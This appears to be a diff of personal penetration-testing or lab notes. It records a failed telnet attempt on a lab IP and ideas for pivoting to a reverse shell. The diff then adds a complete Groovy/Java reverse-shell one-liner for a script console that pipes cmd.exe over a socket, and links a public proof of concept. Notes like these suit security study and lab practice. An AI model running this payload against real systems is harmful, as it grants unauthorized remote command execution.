@@ -383,7 +383,14 @@ Succesful.
 
 Tried to telnet -a 192.168.64.129 5555 presented no yield. Other options that come to mind is to pivot and either use Powershell or get NC.exe downloaded on victim machine or have victim machine execute a malicious .ps script that will need to be currated for a reverse shell attempt.
 
+## Since we already have a Script Console to work off, there should be easier methods to gain reverse shell.
 
+A POC exists at https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
+
+    String host="localhost";
+    int port=8044;
+    String cmd="cmd.exe";
+    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 
 
 
